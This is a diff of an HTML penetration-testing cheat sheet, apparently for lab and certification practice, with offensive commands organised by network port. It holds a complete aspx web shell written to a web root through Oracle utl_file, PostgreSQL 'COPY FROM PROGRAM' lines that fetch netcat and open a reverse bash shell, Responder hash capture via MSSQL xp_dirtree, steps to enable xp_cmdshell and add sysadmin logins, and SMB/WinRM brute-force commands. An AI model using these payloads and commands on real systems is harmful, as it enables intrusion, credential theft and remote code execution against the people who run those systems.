+                    <td>lsaremoveacctrights</td>
+                </tr>
+                <tr>
+                    <td>Enumerate trusted domain within AD forest</td>
+                    <td>dsenumdomtrusts</td>
                 </tr>
             </table>
         </ul>
     </ul>
-</ul>
 
+    <h2>143 TCP / IMAP</h2>
 
-<h2>636 TCP / LDAPS</h2>
-<li>LDAP SSL connection</li>
-<br>
-
-<h2>837 TCP / rsync</h2>
-
-<table>
-    <tr>
-        <td>Enumerate shared folders</td>
-        <td>rsync &lt;ip address&gt;::</td>
-    </tr>
-    <tr>
-        <td>List files in a shared folder</td>
-        <td>rysnc &lt;ip&gt;::&lt;rsync share&gt;</td>
-    </tr>
-    <tr>
-        <td>Download a file from remote machine</td>
-        <td>rsync &lt;ip address&gt;::&lt;remote file&gt; &lt;local directory&gt;</td>
-    </tr>
-    <tr>
-        <td>Download a directory from remote machine</td>
-        <td>rsync -r &lt;ip address&gt;::&lt;remote directory/share&gt; &lt;local directory&gt;</td>
-    </tr>
-    <tr>
-        <td>Create remote directory on local machine</td>
-        <td>rsync -av rsync://&lt;username&gt;@&ltip address:port&gt;/&lt;share name&gt; ./&lt;&lt;local directory>&gt;</td>
-    </tr>
-    <tr>
-        <td>Upload a file to remote machine</td>
-        <td>rsync ./&lt;local file&gt; &lt;ip&gt;::&lt;remote directory&gt;</td>
-    </tr>
-    <tr>
-        <td>Upload directory to remote machine</td>
-        <td>rsync -r ./&lt;local directory&gt; &lt;ip address&gt;::&lt;remote directory&gt;</td>
-    </tr>
-    <tr>
-        <td>Upload/create directory on local machine on remote machine</td>
-        <td>rsync -av ./.ssh rsync://&lt;ip address&gt;/&lt;share name&gt;</td>
-    </tr>
-    <tr>
-        <td>Specify a ssh port for rsync if ssh is not running on 22</td>
-        <td>rync -a -e "ssh -p &lt;port #&gt;" &lt;local directory&gt; &lt;user&gt;@&lt;ip address&gt;:&lt;directory&gt;</td>
-    </tr>
-</table>
-
-<h2>1025 TCP / msrpc</h2>
-<br>
-<h2>1433 TCP / Microsoft SQL</h2>
-<li>Good resource: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</li>
-<li>Retrieve mssql service's password using smb</li>
-<table>
-    <tr>
-        <td>Set listener on Kali</td>
-        <td>sudo responder -I tun0</td>
-    </tr>
-    <tr>
-        <td>Connect to non-existing SMB server from mssql</td>
-        <td>xp_dirtree '\\&lt;ip address&gt;\&lt;fake share name&gt;'</td>
-    </tr>
-    <tr>
-        <td>Crack the NetNTLMv2 output hash on Kali responder</td>
-        <td>hashcat -m 5600</td>
-    </tr>
-    <tr>
-        <td>Log in with mssql-svc password retrieved</td>
-        <td>mssqlclient mssql-svc:'&ls;password&gt;'@&lt;ip&gt; -windows-auth</td>
-    </tr>
-</table>
-<li>Run / enable shell commands</li>
-<table>
-    <tr>
-        <td>Enable xp_cmdshell (with impacket-mssqlclient)</td>
-        <td>enable_xp_cmdshell</td>
-    </tr>
-    <tr>
-        <td>Run shell command (with impacket-mssqlclient)</td>
-        <td>xp_cmdshell &lt;command&gt;</td>
-    </tr>
-    <tr>
-        <td>Enable xp_cmdshell (without impacket-mssqlclient)</td>
-        <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
-    </tr>
-    <tr>
-        <td>Run shell command (without impacket-mssqlclient)</td>
-        <td>EXEC xp_cmdshell '&lt;command&gt;';</td>
-    </tr>
-</table>
-<li>sqsh</li>
-<ul>
-    <li>append server to /etc/freetds/freetds.config</li>
-    <pre>[&lt;hostname&gt;]
-        host = &lt;ip&gt;
-        port = &lt;port #&gt;
-    tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;</pre>
-    <li>Commands</li>
     <table>
         <tr>
             <td>Login</td>
-            <td>sqsh -S &lt;ip&gt; -U &lt;user&gt; -P &lt;password&gt;<br>&lt;ip address&gt; can be replaced with hostname if specified in freetds.config file</td>
+            <td>LOGIN &lt;username&gt; &lt;password&gt;<br><li>If enclosing values with quotes they must be escaped with a \</li></td>
         </tr>
         <tr>
-            <td>Send command</td>
-            <td>go (after entering command)</td>
-        </tr>
-    </table>
-</ul>
-<li>Mssql commands</li>
-<table>
-    <tr>
-        <td>Run shell command</td>
-        <td>EXEC xp_cmdshell '&lt;command&gt;'</td>
-    </tr>
-    <tr>
-        <td>Enable xp_cmdshell</td>
-        <td>EXEC sp_configure 'show advanced options', 1;<br>RECONFIGURE;<br>EXEC sp_configure 'xp_cmdshell', 1;<br>RECONFIGURE;</td>
-    </tr>
-    <tr>
-        <td>View databases</td>
-        <td>SELECT name FROM master.dbo.sysdatabases</td>
-    </tr>
-    <tr>
-        <td>Select/use a database</td>
-        <td>use &lt;db&gt;</td>
-    </tr>
-    <tr>
-        <td>Get table names</td>
-        <td>SELECT * FROM &lt;db name&gt;.INFORMATION_SCHEMA.TABLES;<br>(use &lt;db&gt; first)SELECT name FROM sysobjects WHERE xtype = 'U'</td>
-    </tr>
-    <tr>
-        <td>List linked servers</td>
-        <td>EXEC sp_linkedservers<br>SELECT * FROM sys.servers;</td>
-    </tr>
-    <tr>
-        <td>List users</td>
-        <td>select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;</td>
-    </tr>
-    <tr>
-        <td>Create user with sysadmin privs</td>
-        <td>CREATE LOGIN &lt;username&gt; WITH PASSWORD = '&lt;password&gt;'<br>sp_addsrvrolemember '&lt;username&gt;', 'sysadmin</td>
-    </tr>
-    <tr>
-        <td>View password hashes</td>
-        <td>SELECT name, password_hash FROM master.sys.sql_logins</td>
-    </tr>
-    <tr>
-        <td>View permissions</td>
-        <td>SELECT * FROM fn_my_permissions(NULL, 'SERVER');</td>
-    </tr>
-</table>
-
-<h2>1521 TCP / Oracle TNS Listener</h2>
-
-<li>Oracle DB exploit guide</li>
-<ul>
-    <li>blackhat.com/presentations/bh-usa-09/GATES/BHUSA09-Gates-OracleMetasploit-SLIDES.pdf</li>
-</ul>
-<li>Metasploit for Oracle</li>
-<ul>
-    <li>blog.zsec.uk/msforacle/</li>
-</ul>
-<li>ODAT</li>
-<ul>
-    <li>Requires sqlplus to run correctly</li>
-
-    <li>Methodology</li>
-    <table>
-        <tr>
-            <td>Enumerate SID for Oracle DB</td>
-            <td>
-                <li>odat sidguess</li>
-                <li>auxiliary/scanner/oracle/sid_brute</li>
-            </td>
+            <td>List Folders/Mailboxes</td>
+            <td>A1 LIST *<br>A1 LIST INBOX *<br>A1 LIST "Archive" *</td>
         </tr>
         <tr>
-            <td>Brute force login credentials</td>
-            <td>
-                <li>odat passwordguesser</li>
-                <li>auxiliary/scanner/oracle/oracle_login</li>
-                <li>*Passwords are typically lowercase</li>
-            </td>
-        </tr>
-
-        <tr>
-            <td>Log into Oracle DB</td>
-            <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt;</td>
+            <td>Create new folder/inbox</td>
+            <td>A1 CREATE &lt;name&gt;"</td>
         </tr>
         <tr>
-            <td>Log into Oracle DB with sys db admin (sudo for oracle)</td>
-            <td>sqlplus64 &lt;username&gt;/&lt;password&gt;@&lt;ip address&gt;:&lt;port&gt;/&lt;DB Name&gt; as sysdba</td>
+            <td>Delete folder/mailbox</td>
+            <td>A1 DELETE &lt;name&gt;</td>
+        </tr>
+        <tr>
+            <td>Rename folder/mailbox</td>
+            <td>A1 RENAME &lt;mailbox to rename&gt; &lt;new name&gt;</td>
+        </tr>
+        <tr>
+            <td>List subscribed folders</td>
+            <td>A1 LSUB "" *</td>
+        </tr>
+        <tr>
+            <td>Status of a mailbox</td>
+            <td>A1 STATUS INBOX (messages unseen recent)</td>
+        </tr>
+        <tr>
+            <td>Select a mailbox</td>
+            <td>A1 SELECT INBOX</td>
+        </tr>
+        <tr>
+            <td>List Messages</td>
+            <td>List messages A1 FETCH:* (flags)<br>A1 UID FETCH 1:* (flags)</td>
+        </tr>
+        <tr>
+            <td>Retrieve message content</td>
+            <td>A1 FETCH 2 body[text]<br>A1 FETCH 2 all<br> A1 UID FETCH 102 (UID RFC822.SIZE BODY.PEEK[])</td>
+        </tr>
+        <tr>
+            <td>Close mailbox</td>
+            <td>A1 CLOSE</td>
+        </tr>
+        <tr>
+            <td>Logout</td>
+            <td>A1 LOGOUT</td>
         </tr>
     </table>
 
-    <li>ODAT Commands</li>
-    <table>
-        <tr>
-            <td>Scan Oracle DB</td>
-            <td>
-                <li>odat all -s &lt;ip address&gt; -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt;</li>
-                <li>Add --sysdba flag to authenticate as sysdba (sudo for Oracle)</li>
-            </td>
-        </tr>
-        <tr>
-            <td>Authenticate as sysdba (sudo for Oracle)</td>
-            <td>--sysdba</td>
-        </tr>
-        <tr>
-            <td>Upload file</td>
-            <td>
-                <li>odat dbmsadvisor -s 10.10.10.82 -d &lt;database&gt; -U &lt;username&gt; -P &lt;password&gt; --sysdba --putFile C:\\inetpub\\wwwroot &lt;remote file&gt; &lt;local file&gt;</li>
-                <ul>
-                    <li>Also try dbmsxslprocessor instead of dbmsadvisor</li>
-                </ul>
-            </td>
-        </tr>
-    </table>
+    <h2>161 UDP / SNMP</h2>
 
-    <li>Oracle DB Commands:</li>
-    <table>
-        <tr>
-            <td>View privileges</td>
-            <td>select * from session_privs;<br>select * from user_role_privs;</td>
-        </tr>
-        <tr>
-            <td>Read file</td>
-            <td>declare<br>f utl_file.file_type;<br>s varchar(400);<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', 'iisstart.htm', 'R');<br>utl_file.get_line(f,s);<br>utl_file.fclose(f);<br>dbms_output.put_line(s);<br>end;</td>
-        </tr>
-        <tr>
-            <td>Write file</td>
-            <td>declare<br>f utl_file.file_type;<br>s varchar(5000) := '&lt;insert text to write&gt;';<br>begin<br>f := utl_file.fopen('/inetpub/wwwroot', '&lt;file to write&gt;', 'W');<br>utl_file.put_line(f,s);<br>utl_file.fclose(f);<br>end;</td>
-        </tr>
-        <tr>
-            <td>Run last procedure</td>
-            <td>/</td>
-        </tr>
-        <tr>
-            <td>View output</td>
-            <td>set serveroutput ON</td>
-        </tr>
-    </table>
-
-</ul>
-<li>Generating shell for Oracle</li>
-<ul>
-    <li>1024 character max</li>
-    <li>aspx for Windows</li>
-    <li>Must all be on one line</li>
     <ul>
-        <li>sed -z 's/\n//g' &lt;file&gt;</li>
+        <li>SNMP Management Information Base (MIB) - A database containing information usually related to network management</li>
+        <li>Simple Network Management Protocol.  Used for the management and monitoring of network devices.</li>
+        <li>Susceptible to IP spoofing and replay attacks because it is based on UDP</li>
+        <li>SNMP 1, 2, and 2c do not encrypt traffic.  Credentials and information can be intercepted over the local network.</li>
+        <li>Commonly left with configured with default public and private community strings.  Default read-only community string is usually "public"</li>
+        <ul>
+            <li>Community Strings/MIB Values:</li>
+            <table>
+                <tr>
+                    <td>TCP Local Ports</td>
+                    <td>1.3.6.1.2.1.6.13.1.3</td>
+                </tr>
+                <tr>
+                    <td>User Accounts</td>
+                    <td>1.3.6.1.4.1.77.1.2.25</td>
+                </tr>
+                <tr>
+                    <td>Software Name</td>
+                    <td>1.3.6.1.2.1.25.6.3.1.2</td>
+                </tr>
+                <tr>
+                    <td>Storage Units</td>
+                    <td>1.3.6.1.2.1.25.2.3.1.4</td>
+                </tr>
+                <tr>
+                    <td>Processes Path</td>
+                    <td>1.3.6.1.2.1.25.4.2.1.4</td>
+                </tr>
+                <tr>
+                    <td>Running Programs</td>
+                    <td>1.3.6.1.2.1.25.4.2.1.2</td>
+                </tr>
+                <tr>
+                    <td>System Processes</td>
+                    <td>1.3.6.1.2.1.25.1.6.0</td>
+                </tr>
+            </table>
+        </ul>
+        <li>Tools</li>
+        <ul>
+            <li>onesixtyone - SNMP scanner - brute force community strings</li>
+            <li>snmpwalk - probe and query SNMP values using a community string</li>
+            <table>
+                <tr>
+                    <td>Enumerate full MIB Tree</td>
+                    <td>snmpwalk -c public -v1 -t 10 &lt; address&gt;<br>snmpwalk -c public -v 2c -c public &lt;ip address&gt;</td>
+                </tr>
+                <tr>
+                    <td>Enumerate Specific MIB value</td>
+                    <td>snmpwalk -c public -v1 &lt;ip address&gt; &lt;Community String/MIB Value&gt;</td>
+                </tr>
+            </table>
+        </ul>
     </ul>
-    <li>aspx web shell example:</li>
-    <pre>declare
-        f utl_file.file_type;
-        s varchar(5000) := '&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language="c#" runat="server"&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = "cmd.exe";psi.Arguments = "/c "+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write("&lt;pre&gt;");Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write("&lt;/pre&gt;");}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id="cmd" method="post" runat="server"&lt;&gt;asp:TextBox id="txtArg" runat="server" Width="250px"&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id="testing" runat="server" Text="excute" OnClick="cmdExe_Click"&gt;&lt;/asp:Button&gt;&lt;asp:Label id="lblText" runat="server"&t;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;';
-        begin
-        f := utl_file.fopen('/inetpub/wwwroot', 'shell.aspx', 'W');
-        utl_file.put_line(f,s);
-        utl_file.fclose(f);
-        end;
-    </pre>
-</ul>
 
-<h2>2049 TCP / mountd (NFS)</h2>
-<li>sudo apt install nfs-common</li>
-<table>
-    <tr>
-        <td>Show paths that can be mounted and who can mount them</td>
-        <td>showmount -e &lt;ip address&gt;</td>
-    </tr>
-    <tr>
-        <td>Show client IP's using the mount</td>
-        <td>showmount -a &lt;ip address&gt;</td>
-    </tr>
-    <tr>
-        <td>mount an NFS path</td>
-        <td>mount -t nfs &lt;ip address&gt;:&lt;nfs share&gt;  &lt;local directory to mount to - Example: /mnt/&gt;</td>
-    </tr>
-</table>
-
-<h2>3000 TCP / Express.js Node</h2>
-<li>hadoop</li>
-<ul>
-    <li>Big data storage solution</li>
-    <li>Data analytics & Data science</li>
-</ul>
-
-<h2>3268 TCP / LDAP
-</h2>
-<li>LDAP connection to Global Catalog instead of the local DC which port 389 will return information for</li>
-<li>LDAP requests sent to port 3268 can be used to search for objects in the entire forest.</li>
-<li>Only the attributes marked for replication to the global catalog can be returned.</li>
-<br>
-<h2>3269 TCP / LDAPS</h2>
-<li>LDAP connection to Global Catalog over SSL.</li>
-
-<h2>3306 TCP / MySql</h2>
-<li>Connect to a mysql database</li>
-<ul>
-    <li>impacket-mssqlclient username:password@ip.address</li>
-    <li>mysql --host=127.0.0.1 --port=13306 --user=&lt;username&gt; -p&lt;password (no space after -p)&gt;</li>
+    <h2>389 TCP / LDAP</h2>
     <ul>
-        <li>Connect to local port (port forwarding in this example) 13306 as &lt;username&gt;</li>
-    </ul>
-</ul>
-
-<li>User-Defined Functions (UDF)</li>
-<ul>
-    <li>Similar to a custom plugin for mysql</li>
-    <li>Allows administrators to create custom repeatable functions to accomplish specific objectives</li>
-    <li>Written in C or C++ and will run almost any code including system commands</li>
-</ul>
-<table>
-    <tr>
-        <td>Show variables</td>
-        <td>
-            <li>show variables;</li>
+        <li>TCP 389 LDAP plain text</li>
+        <li>Used for requesting information from the local domain controller.</li>
+        <li>LDAP requests sent to port 389 can be used to search for objects only within the global catalog’s home domain. </li>
+        <li>The requesting application can obtain all of the attributes for those objects.</li>
+        <ul>
+            <li>For example, a request to port 389 could be used to obtain a user’s department</li>
+        </ul>
+        <li>Tools</li>
+        <ul>
+            <li>nmap --script ldap-search</li>
+            <li>Listen on localhost for ldap traffic</li>
             <ul>
-                <li>Some possible interesting variabels</li>
+                <li>List on localhost for ldap traffic</li>
                 <ul>
-                    <li>hostname</li>
-                    <li>tmp directory</li>
-                    <li>version</li>
-                    <li>Architecture</li>
-                    <li>plugin_dir</li>
+                    <li>tcpdump -i lo -nnXs 0 'port 389'</li>
+                    <table>
+                        <tr>
+                            <td>Do no conver hosts or ports to name</td>
+                            <td>nn</td>
+                        </tr>
+                        <tr>
+                            <td>Print in ascii and hex</td>
+                            <td>X</td>
+                        </tr>
+                        <tr>
+                            <td>Capture entire packet</td>
+                            <td>-s 0</td>
+                        </tr>
+                    </table>
                 </ul>
             </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>Show user privileges</td>
-        <td>SHOW grants;</td>
-    </tr>
-    <tr>
-        <td>Show individual variable</td>
-        <td>select @@&lt;variable &ndash; ex. plugin_dir&gt;;</td>
-    </tr>
-    <tr>
-        <td>Show plugins directory</td>
-        <td>show variables like '%plugin_dir%';</td>
-    </tr>
-    <tr>
-        <td>Show databases</td>
-        <td>use &lt;database name&gt;;</td>
-    </tr>
-    <tr>
-        <td>Show MariaDB version</td>
-        <td>@@version</td>
-    </tr>
-    <tr>
-        <td>Show the user being used to make queries</td>
-        <td>user()</td>
-    </tr>
-    <tr>
-        <td>Retrieve database information like table and column names.  A lot of information about default objects.</td>
-        <td>id=1 union all select #(1),of(2),columns(3), table_name from information_schema.tables</td>
-    </tr>
-    <tr>
-        <td>Output all columns from a specified table</td>
-        <td>column_name from information_schema.columns where table_name='TableName'</td>
-    </tr>
-    <tr>
-        <td>Select username and password columns from TableName</td>
-        <td>Select username, password from TableName</td>
-    </tr>
-    <tr>
-        <td>Show all columns and records in the users table</td>
-        <td>select * from users;</td>
-    </tr>
-    <tr>
-        <td>Show username field from the users table and only show records with an id of 1.</td>
-        <td>SELECT username FROM users WHERE id=1;</td>
-    </tr>
-    <tr>
-        <td>Load data from file into a table</td>
-        <td>LOAD DATA LOCAL INFILE '/var/www/html/index.php' INTO TABLE &lt;table name&gt; FIELDS TERMINATED BY "\n"</td>
-    </tr>
-    <tr>
-        <td>Change cell contents</td>
-        <td>UPDATE &lt;Table&gt; SET &lt;Column&gt;=&#039;&lt;Value&gt;&#039; WHERE &lt;Column&gt;=&#039;&lt;Value&gt;&#039;;</td>
-    </tr>
-    <tr>
-        <td>Create Database</td>
-        <td>Create Database &lt;Database Name&gt;;</td>
-    </tr>
-    <tr>
-        <td>Create user</td>
-        <td>create user &#039;&lt;username&gt;&#039;@&#039;&lt;host&gt;&#039; IDENTIFIED BY &#039;&lt;password?&gt;&#039;;</td>
-    </tr>
-    <tr>
-        <td>Give all permissions to user</td>
-        <td>GRANT ALL on &lt;database&gt;.* TO &#039;&lt;user&gt;&#039;@&#039;&lt;host&gt;&#039;;</td>
-    </tr>
-    <tr>
-        <td>String delimiter.  Can use to check for SQL injection vulnerabilities</td>
-        <td>'</td>
-    </tr>
-    <tr>
-        <td>Comment marker.  Removes the statement after it from the query.</td>
-        <td>#</td>
-    </tr>
-    <tr>
-        <td>Limit the number of records that a query pulls</td>
-        <td>LIMIT &lt;number&gt;</td>
-    </tr>
-    <tr>
-        <td>Set binary variable</td>
-        <td>set @&lt;variable name&gt; = 0x&lt;binary/hex code&gt;</td>
-    </tr>
-    <tr>
-        <td>Output binary variable to file</td>
-        <td>select binary @&lt;binary variable&gt; into dumpfile &#039;/home/directory/to/put/file/something.so&#039;;</td>
-    </tr>
-    <tr>
-        <td>Information about tables and databases</td>
-        <td>information_schema.tables</td>
-    </tr>
-</table>
-
-<h2>3389 TCP / RDP</h2>
-<br>
-
-<h2>3690 TCP / SVN</h2>
-<table>
-    <tr>
-        <td>list svn contents</td>
-        <td>svn list svn://&lt;ip address&gt;</td>
-    </tr>
-    <tr>
-        <td>create local copy of respository </td>
-        <td>svn checkout svn://&lt;ip address&gt;</td>
-    </tr>
-    <tr>
-        <td>Log history</td>
-        <td>svn log</td>
-    </tr>
-    <tr>
-        <td>View/walk revisions</td>
-        <td>svn up -&lt;revision from log&gt;</td>
-    </tr>
-</table>
-
-<h2>5432 TCP Postgresql</h2>
-<li>Default credentials are</li>
-<ul>
-    <li>Username: postgres</li>
-    <li>Password: postgres</li>
-    <ul>
-        <li>Sometimes no password?</li>
+            <li>ldapsearch</li>
+            <table>
+                <tr>
+                    <td>Basic search</td>
+                    <td>ldapsearch -h &lt;ip address&gt;</td>
+                </tr>
+                <tr>
+                    <td>Simple authentication</td>
+                    <td>ldapsearch -h &lt;ip address&gt; -x</td>
+                </tr>
+                <tr>
+                    <td>Authenticate as user</td>
+                    <td>ldapsearch -h &lt;ip address&gt; -x -D '&ls;user&gt;@&lt;domain&gt;' -w '&lt;password&gt;' -b 'DC=something,DC=something'</td>
+                </tr>
+                <tr>
+                    <td>Retrieve naming contexts</td>
+                    <td>ldapsearch -h &lt;ip address&gt; -x -s base namingcontexts<br>Output can be thought of folders and they are different types of folders</td>
+                </tr>
+                <tr>
+                    <td>Output all the LDAP information that can be queried</td>
+                    <td>
+                        <ul>
+                            <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;"</li>
+                            <ul>
+                                <li>DC=values from output of "Retrieving name contexts" command</li>
+                            </ul>
+                            <li>Terms to grep for on this file (can be done instead of querying ldap for a term directly):</li>
+                            <ul>
+                                <li>member</li>
+                                <li>CN=</li>
+                                <li>memberof</li>
+                                <li>user</li>
+                                <li>Password (and variations such as pwd)</li>
+                                <li>Look for anomalies in output</li>
+                                <ul>
+                                    <li>cat &lt;ldap output file&gt; | awk '{print $1}' | sort | uniq -c | sort -nr</li>
+                                </ul>
+                            </ul>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td>Query LDAP</td>
+                    <td>
+                        <ul>
+                            <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;'</li>
+                            <ul>
+                                <li>Queries to search:</li>
+                                <ul>
+                                    <li>objectClass=Person</li>
+                                    <ul>
+                                        <li>pwdLastSet</li>
+                                        <ul>
+                                            <li>Convert to human readble using online converter:<br>https://www.epochconverter.com/ldap</li>
+                                        </ul>
+                                        <li>sAMAccountName = username</li>
+                                        <ul>
+                                            <li>User is equivalent (not equivalent as a filter)</li>
+                                        </ul>
+                                    </ul>
+                                </ul>
+                            </ul>
+                        </ul>
+                    </td>
+                </tr>
+                <tr>
+                    <td>Query LDAP with Filters</td>
+                    <td>
+                        <ul>
+                            <li>ldapsearch -h &lt;ip address&gt; -x -b "DC=&lt;value&gt;,DC=&lt;value&gt;" '&lt;Query to search&gt;' &lt;Filter&gt;</li>
+                            <ul>
+                                <li>Can add more than 1 filter</li>
+                                <ul>
+                                    <li>'&lt;Query to search&gt;' &lt;filter 1&gt; &lt;filter 2&gt; &lt;filter 3&gt; ...</li> 
+                                </ul>
+                                <li>Filter examples</li>
+                                <ul>
+                                    <li>sAMAccountName</li>
+                                    <ul>
+                                        <li>Retrieve all usernames.  grep for sAMAccountName to get list of usernames.</li>
+                                        <ul>
+                                            <li>Accounts with $ are machine generated.  Passwords not crackable.</li>
+                                            <li>SM_  and HealthMailbox accounts are Exchange related.  Passwords not crackable.</li>
+                                        </ul>
+                                    </ul>
+                                    <li>Domain admins</li>
+                                    <ul>
+                                        <li>"(&(objectClass=user)(memberOf=CN=Domain Admins,CN=Users,DC=htb,DC=local))"</li>
+                                    </ul>
+                                </ul>
+                            </ul>
+                        </ul>
+                    </td>
+                </tr>
+            </table>
+        </ul>
     </ul>
-</ul>
-<li>Typical reverse shell privileges</li>
-<ul>
-    <li>NT AUTHORITY/NETWORK SERVICE (low priv)</li>
-    <li>Linux - postgres (low priv)</li>
-    <li>Mac - user that installed postgres (usually an admin)</li>
-</ul>
-<li>Tools</li>
-<ul>
-    <li>psql</li>
+
+
+    <h2>443 TCP / HTTPS</h2>
+
+    <li>Secure version of port 80.  Most of the same things apply</li>
+    <li>Check certificate for any interesting information</li>
+    <br>
+    <h2>445 TCP / SMB</h2>
+
+    <li>SMB is the protocol, CIFS is an old dialect of SMB, and my is the Linux/Unix-like implementation of the SMB protocol.</li>
+    <li>Try logging in as guest as well as null authentication</li>
+    <li>Brute force usernames by themselves or with passwords</li>
+    <li>If errors with any  smb command install: cifs-utils</li>
+    <li>enum4linux &lt;ip address&gt;</li>
+    <li>Mounting SMB share</li>
     <table>
         <tr>
-            <td>connect to databse</td>
-            <td>psql -h &lt;ip address&gt; -U &lt;username&gt;</td>
-        </tr>
-        <tr>
-            <td>List databases</td>
-            <td>\list</td>
-        </tr>
-        <tr>
-            <td>use databases</td>
-            <td>\c &lt;db&gt;</td>
-        </tr>
-        <tr>
-            <td>List tables</td>
-            <td>\d</td>
-        </tr>
-        <tr>
-            <td>Get user roles</td>
-            <td>\du+</td>
-        </tr>
-        <tr>
-            <td>Browse system files</td>
-            <td>select pg_ls_dir('./');<br>select pg_ls_dir('/etc/passwd');</td>
-        </tr>
-        <tr>
-            <td>Read files by copying contents to a table</td>
+            <td>Mount SMB Share</td>
             <td>
                 <table>
                     <tr>
-                        <td>Create table</td>
-                        <td>create table docs (data TEXT);</td>
+                        <td>Create a folder to mount to</td>
+                        <td>sudo mkdir /mnt/&lt;folder&gt;</td>
                     </tr>
                     <tr>
-                        <td>Copy contents to a table</td>
-                        <td>copy docs from '/etc/passwd';</td>
+                        <td>Mounting command and some different options</td>
+                        <td>
+                            <li>sudo mount -t cifs -o vers=1.0 //10.11.1.136/'&lt;share name&gt;' /mnt/&lt;folder&gt;</li>
+                            <ul>
+                                <li>-o username=&lt;username&gt;,dir_mode=777,file_mode=666</li>
+                                <li>-o username=&lt;username&gt;,uid=user,gid=group</li>
+                                <li>-o 'user=&lt;username&gt;,password=&lt;password&gt;'</li>
+                            </ul>
+                        </td>
                     </tr>
                     <tr>
-                        <td>Display table contents</td>
-                        <td>select * from docs limit 10;</td>
+                        <td>Unmount SMB Share (Forced & Lazy)</td>
+                        <td>sudo umount -f &lt;mounted share directory&gt;</td>
                     </tr>
                 </table>
             </td>
         </tr>
     </table>
-</ul>
-<li>RCE</li>
-<table>
-    <tr>
-        <td>Drop table</td>
-        <td>DROP TABLE IF EXISTS cmd_exec;</td>
-    </tr>
-    <tr>
-        <td>Create table</td>
-        <td>CREATE TABLE cmd_exec(cmd_output text);</td>
-    </tr>
-    <tr>
-        <td>Setup command</td>
-        <td>COPY cmd_exec FROM PROGRAM 'id'<br>COPY cmd_exec FROM PROGRAM 'wget http://&lt;ip address&gt;/nc';<br>COPY cmd_exec FROM PROGRAM 'nc -n &lt;ip address&gt; &lt;rev shell port&gt; -e /usr/bin/bash';</td>
-    </tr>
-    <tr>
-        <td>Remove command</td>
-        <td>DELETE FROM cmd_exec;</td>
-    </tr>
-    <tr>
-        <td>Execute command</td>
-        <td>SELECT * FROM cmd_exec;</td>
-    </tr>
-</table>
-
-<h2>5985 TCP / Microsoft HTTPAPI</h2>
-<br>
-
-<h2>5985 TCP / WinRM</h2>
-<li>Windows remote management</li>
-<ul>
-    <li>Can log into a remote shell using user credentials</li>
-    <ul>
-        <li>Only users part of groups that have rights to this are allowed to login this way</li>
-    </ul>
-</ul>
-<li>Tools</li>
-<ul>
-    <li>Evil-WinRM</li>
-    <ul>
-        <li>https://github.com/Hackplayers/evil-winrm</li>
-    </ul>
+    <li>crackmapexec</li>
     <table>
         <tr>
-            <td>Usage</td>
-            <td>evil-winrm -I &lt;ip address&gt; -u &lt;username&gt; -p &lt;password&gt;</td>
+            <td>Check password policies</td>
+            <td>crackmapexec smb --pass-pol &lt;ip address&gt;</td>
         </tr>
         <tr>
-            <td>Show menu</td>
-            <td>menu</td>
+            <td>Check password policies with null authentication</td>
+            <td>
+                <li>crackmapexec smb --pass-pol &lt;ip address&gt; -u '' -p ''</li>
+                <ul>
+                    <li>This generally works on Domains from 2003.  Newly installed domains do not like null authentication</li>
+                    <li>If this works then note that null authentication allows domain enumeration and a lot of information can be found</li>
+                </ul>
+            </td>
         </tr>
         <tr>
-            <td>Invoke-Binary</td>
-            <td>Invoke-Binary &lt;.exe on local machine&gt;</td>
+            <td>
+                <li>Enumerate SMB Shares</li>
+                <ul>
+                    <li>Attempt with non-existent username and password</li>
+                </ul>
+            </td>
+            <td>smb -u &lt;username&gt; -p &lt;password&gt; --shares</td>
         </tr>
         <tr>
-            <td>Bypass AMSI</td>
-            <td>Bypass-4MSI</td>
+            <td>SMB Brute force</td>
+            <td>smb -u &lt;username&gt; -p &lt;password&gt;</td>
         </tr>
         <tr>
-            <td>Connect with SSL cert</td>
-            <td>evil-winrm -i &lt;ip address&gt; -u &lt;user&gt; -p &lt;password&gt; -k &lt;private key&gt; -c &lt;signed key/certificate&gt; -S</td>
+            <td>WinRM Brute Force</td>
+            <td>
+                <li>winrm -u &lt;username&gt; -p &lt;password&gt;</li>
+                <ul>
+                    <li>If successful, get shell using evil-winrm</li>
+                </ul>
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <li>Crawl shares and output in json format</li>
+                <ul>
+                    <li>Read output with jq . &lt;file&gt;</li>                
+                </ul>
+            </td>
+            <td>-M spider_plus</td>
         </tr>
     </table>
-</ul>
+    <li>Query registry information - impacket-reg</li>
+    <table>
+        <tr>
+            <td>Query HKU</td>
